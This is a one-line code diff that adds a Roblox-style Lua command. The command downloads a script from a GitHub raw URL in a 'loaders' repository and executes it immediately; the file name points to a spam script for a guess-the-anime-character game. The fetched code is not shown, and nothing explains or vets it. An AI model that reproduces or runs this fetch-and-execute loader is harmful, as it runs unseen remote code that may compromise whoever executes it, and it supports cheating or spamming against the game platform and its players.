@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/2-player-guess-the-anime-character-spam5-57o04th8iiaceg.lua"))()
